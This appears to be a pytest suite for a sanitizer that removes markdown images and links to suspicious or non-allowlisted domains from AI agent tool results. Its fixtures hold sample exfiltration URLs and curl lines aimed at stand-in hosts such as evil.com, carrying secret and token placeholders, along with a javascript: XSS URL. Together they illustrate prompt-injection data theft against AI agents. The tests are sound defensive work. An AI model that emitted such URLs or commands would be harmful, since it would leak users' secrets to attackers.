# Copyright © 2026 Isaiah Dallas Jefferson, Jr. AgentShroud™
from __future__ import annotations

"""
Tests for Enhanced Tool Result Sanitizer with Domain Allowlist.
"""

from unittest.mock import patch

import pytest

from gateway.security.tool_result_sanitizer_enhanced import (
    ToolResultSanitizer,
    ToolResultSanitizerConfig,
    sanitize_tool_result,
)


class TestToolResultSanitizerConfig:
    """Test ToolResultSanitizerConfig."""

    def test_default_config(self):
        """Test default configuration values."""
        config = ToolResultSanitizerConfig()

        assert config.mode == "enforce"
        assert config.preserve_code_blocks is True
        assert config.preserve_internal_links is True
        assert "github.com" in config.allowed_domains
        assert "docs.python.org" in config.allowed_domains
        assert "*.github.com" in config.allowed_domains
        assert "exfil" in config.blocked_patterns
        assert "SYSTEM" in config.blocked_patterns

    def test_custom_config(self):
        """Test custom configuration."""
        config = ToolResultSanitizerConfig(
            mode="warn",
            allowed_domains=["example.com"],
            blocked_patterns=["custom_pattern"],
            preserve_code_blocks=False,
        )

        assert config.mode == "warn"
        assert config.allowed_domains == ["example.com"]
        assert config.blocked_patterns == ["custom_pattern"]
        assert config.preserve_code_blocks is False


class TestToolResultSanitizer:
    """Test ToolResultSanitizer functionality."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config = ToolResultSanitizerConfig()
        self.sanitizer = ToolResultSanitizer(self.config)

    def test_empty_or_none_input(self):
        """Test handling of empty or None input."""
        assert self.sanitizer.sanitize("") == ""
        assert self.sanitizer.sanitize(None) == ""
        assert self.sanitizer.sanitize("   ") == "   "

    def test_domain_matching_patterns(self):
        """Test domain pattern matching including wildcards."""
        # Exact domain match
        assert self.sanitizer._domain_matches_pattern("github.com", "github.com") is True
        assert self.sanitizer._domain_matches_pattern("github.com", "gitlab.com") is False

        # Wildcard subdomain match
        assert self.sanitizer._domain_matches_pattern("api.github.com", "*.github.com") is True
        assert (
            self.sanitizer._domain_matches_pattern(
                "raw.githubusercontent.com", "*.githubusercontent.com"
            )
            is True
        )
        assert self.sanitizer._domain_matches_pattern("github.com", "*.github.com") is True
        assert self.sanitizer._domain_matches_pattern("evil.com", "*.github.com") is False

    def test_is_domain_allowed(self):
        """Test domain allowlist checking."""
        # Allowed domains
        assert self.sanitizer._is_domain_allowed("https://github.com/user/repo") is True
        assert self.sanitizer._is_domain_allowed("https://api.github.com/repos") is True
        assert self.sanitizer._is_domain_allowed("https://docs.python.org/3/") is True

        # Non-allowed domains
        assert self.sanitizer._is_domain_allowed("https://evil.com/exfil") is False
        assert self.sanitizer._is_domain_allowed("https://malicious.example.org") is False

        # Malformed URLs
        assert self.sanitizer._is_domain_allowed("not-a-url") is False
        assert self.sanitizer._is_domain_allowed("") is False

    def test_internal_link_detection(self):
        """Test detection of internal/relative links."""
        assert self.sanitizer._is_internal_link("#anchor") is True
        assert self.sanitizer._is_internal_link("/path/to/page") is True
        assert self.sanitizer._is_internal_link("relative/path") is True
        assert self.sanitizer._is_internal_link("https://external.com") is False
        assert self.sanitizer._is_internal_link("http://external.com") is False

    def test_blocked_pattern_detection(self):
        """Test detection of blocked patterns in URLs."""
        # Should detect blocked patterns
        assert (
            self.sanitizer._url_has_blocked_patterns("https://evil.com/exfil?data=secret") is True
        )
        assert self.sanitizer._url_has_blocked_patterns("https://callback.evil.com/webhook") is True
        assert self.sanitizer._url_has_blocked_patterns("https://track.evil.com/beacon") is True
        assert (
            self.sanitizer._url_has_blocked_patterns("https://evil.com/api?token={{SECRET}}")
            is True
        )
        assert (
            self.sanitizer._url_has_blocked_patterns("https://evil.com/collect?key=${API_KEY}")
            is True
        )

        # Should not detect in clean URLs
        assert self.sanitizer._url_has_blocked_patterns("https://github.com/user/repo") is False
        assert self.sanitizer._url_has_blocked_patterns("https://docs.python.org/3/") is False

    def test_malicious_image_stripping(self):
        """Test stripping of malicious markdown images."""
        # Malicious images should be stripped
        malicious_content = """
        Here's some content with a malicious image:
        ![secret data](https://evil.com/exfil?data=secret123)
        And more content.
        """

        result = self.sanitizer.sanitize(malicious_content)
        assert "[Image removed: suspicious URL pattern]" in result
        assert "evil.com" not in result

    def test_malicious_link_stripping(self):
        """Test stripping of malicious markdown links."""
        malicious_content = """
        Check out this [innocent link](https://evil.com/callback?data={{SECRET}})
        And this [tracking link](https://track.evil.com/ping?user=admin).
        """

        result = self.sanitizer.sanitize(malicious_content)
        assert "[Link removed: suspicious URL pattern]" in result
        assert "evil.com" not in result
        assert "track.evil.com" not in result

    def test_external_domain_stripping(self):
        """Test stripping of links to non-allowlisted domains."""
        external_content = """
        This [external link](https://random-site.com/page) should be stripped.
        ![External image](https://cdn.random-site.com/image.jpg)
        """

        result = self.sanitizer.sanitize(external_content)
        assert "external link" in result  # Link text preserved
        assert "random-site.com" not in result
        # The actual output format is "[Image: alt_text]"
        assert "[Image: External image]" in result

    def test_legitimate_links_preserved(self):
        """Test that legitimate links are preserved."""
        legitimate_content = """
        Check the [GitHub repo](https://github.com/user/project).
        See [Python docs](https://docs.python.org/3/library/).
        Look at this [Stack Overflow answer](https://stackoverflow.com/questions/123).
        ![GitHub image](https://raw.githubusercontent.com/user/repo/main/image.png)
        """

        result = self.sanitizer.sanitize(legitimate_content)
        assert "https://github.com/user/project" in result
        assert "https://docs.python.org/3/library/" in result
        assert "https://stackoverflow.com/questions/123" in result
        assert "https://raw.githubusercontent.com/user/repo/main/image.png" in result

    def test_internal_links_preserved(self):
        """Test that internal/relative links are preserved."""
        internal_content = """
        Go to [another section](#section-2).
        Check [this page](/docs/api).
        See [relative link](../other/page.html).
        ![Local image](/assets/image.png)
        """

        result = self.sanitizer.sanitize(internal_content)
        assert "#section-2" in result
        assert "/docs/api" in result
        assert "../other/page.html" in result
        assert "/assets/image.png" in result

    def test_code_blocks_preserved(self):
        """Test that code blocks with URLs are preserved."""
        code_content = """
        Here's some code:
        ```python
        import requests
        response = requests.get("https://evil.com/api?token=secret")
        print(response.json())
        ```
        
        And inline code: `curl https://malicious.example.org/exfil`
        
        But this link outside code should be [stripped](https://evil.com/bad).
        """

        result = self.sanitizer.sanitize(code_content)
        # Code blocks should be preserved
        assert "https://evil.com/api?token=secret" in result
        assert "https://malicious.example.org/exfil" in result
        # But external link outside code should be stripped
        assert "[Link removed: suspicious URL pattern]" in result or "stripped" in result

    def test_warn_mode(self):
        """Test warn mode that marks but preserves external content."""
        config = ToolResultSanitizerConfig(mode="warn")
        sanitizer = ToolResultSanitizer(config)

        content = """
        This [external link](https://external.com/page) should be marked.
        ![External image](https://cdn.external.com/image.jpg)
        """

        result = sanitizer.sanitize(content)
        assert "https://external.com/page" in result
        assert "⚠️ EXTERNAL LINK" in result
        assert "https://cdn.external.com/image.jpg" in result
        assert "⚠️ EXTERNAL IMAGE" in result

    def test_empty_alt_text_handling(self):
        """Test handling of images with empty alt text."""
        content = """
        ![](https://evil.com/image.jpg)
        [](https://evil.com/link)
        """

        result = self.sanitizer.sanitize(content)
        # The actual output format varies based on whether it has alt text
        assert "evil.com" not in result  # External domains removed
        assert "[" in result  # Some form of removal message

    def test_mixed_content_sanitization(self):
        """Test sanitization of mixed legitimate and malicious content."""
        mixed_content = """
        # Documentation
        
        See the [Python docs](https://docs.python.org/3/) for more info.
        
        ![Malicious exfiltration](https://evil.com/exfil?secret={{TOKEN}})
        
        Code example:
        ```bash
        curl https://evil.com/api -H "Authorization: Bearer $TOKEN"
        ```
        
        Check this [legitimate repo](https://github.com/python/cpython).
        
        [Suspicious callback](https://tracker.evil.com/collect?data=sensitive)
        """

        result = self.sanitizer.sanitize(mixed_content)

        # Legitimate content preserved
        assert "https://docs.python.org/3/" in result
        assert "https://github.com/python/cpython" in result

        # Code block preserved
        assert "curl https://evil.com/api -H" in result

        # Malicious content stripped
        assert "evil.com/exfil" not in result or "[Image removed:" in result
        assert "tracker.evil.com" not in result or "[Link removed:" in result

    def test_convenience_function(self):
        """Test the convenience sanitize_tool_result function."""
        content = """
        [Good link](https://github.com/user/repo)
        [Regular external link](https://example.com/page)
        """

        # Test with default config
        result = sanitize_tool_result(content)
        assert "https://github.com/user/repo" in result
        assert "example.com" not in result  # External domains stripped

        # Test with custom config in warn mode
        custom_config = ToolResultSanitizerConfig(mode="warn")
        result = sanitize_tool_result(content, custom_config)
        assert "⚠️ EXTERNAL LINK" in result

    def test_edge_cases(self):
        """Test edge cases and malformed inputs."""
        edge_cases = [
            "![]()",  # Empty URL
            "[text]()",  # Empty URL
            "![text](not-a-url)",  # Invalid URL
            "![text](javascript:alert('xss'))",  # JavaScript URL
            "![text](data:image/png;base64,iVBOR...)",  # Data URL
        ]

        for case in edge_cases:
            result = self.sanitizer.sanitize(case)
            # Should not crash and should handle gracefully
            assert isinstance(result, str)

    @patch("gateway.security.tool_result_sanitizer_enhanced.logger")
    def test_logging(self, mock_logger):
        """Test that appropriate logging occurs."""
        content = """
        ![bad](https://evil.com/exfil?data=secret)
        [bad](https://random-external.com/page)
        """

        self.sanitizer.sanitize(content)

        # Should log warnings for blocked patterns and info for stripped domains
        mock_logger.warning.assert_called()
        mock_logger.info.assert_called()

        # Check that the log messages contain expected information
        warning_calls = mock_logger.warning.call_args_list
        info_calls = mock_logger.info.call_args_list

        assert any("suspicious pattern" in str(call) for call in warning_calls)
        assert any("non-allowlisted domain" in str(call) for call in info_calls)


class TestIntegration:
    """Integration tests for the sanitizer."""

    def test_realistic_web_scraping_result(self):
        """Test sanitizing a realistic web scraping result."""
        web_content = """
        # Company Website
        
        Welcome to our website! 
        
        Check out our [blog](https://blog.oursite.com/latest) for updates.
        
        ![Company logo](https://cdn.oursite.com/logo.png)
        
        ## Documentation
        
        For developers, see our [API docs](https://docs.python.org/3/library/urllib.html).
        
        ![Tracking pixel](https://analytics.evil.com/track?user={{USER_ID}}&page=home)
        
        Contact us at [support](mailto:support@oursite.com).
        
        ```python
        # Example usage
        import requests
        
        response = requests.get("https://evil.com/api", 
                               headers={"Authorization": f"Bearer {token}"})
        ```
        
        [Malicious callback](https://collector.evil.com/exfil?data=sensitive)
        """

        config = ToolResultSanitizerConfig()
        sanitizer = ToolResultSanitizer(config)
        result = sanitizer.sanitize(web_content)

        # Legitimate docs link should be preserved
        assert "https://docs.python.org/3/library/urllib.html" in result

        # Code block should be preserved (even with evil.com)
        assert 'requests.get("https://evil.com/api"' in result

        # Malicious tracking and callbacks should be removed
        assert "analytics.evil.com" not in result or "[Image removed:" in result
        assert "collector.evil.com" not in result or "[Link removed:" in result

        # Regular external content should be sanitized
        assert "blog.oursite.com" not in result or "oursite.com" in config.allowed_domains

        # Email links should be preserved (internal format)
        assert "mailto:support@oursite.com" in result

    def test_performance_with_large_content(self):
        """Test performance with large content."""
        # Create a large content string with many links
        large_content = ""
        for i in range(100):  # Reduced from 1000 for faster testing
            if i % 2 == 0:
                large_content += f"[Good link {i}](https://github.com/repo{i}) "
            else:
                large_content += f"![Bad image {i}](https://evil{i}.com/track) "

        sanitizer = ToolResultSanitizer(ToolResultSanitizerConfig())

        # This should complete without issues
        result = sanitizer.sanitize(large_content)

        # Verify that good links are preserved and bad ones are removed
        assert "github.com" in result
        assert "evil" not in result or "[Image removed:" in result
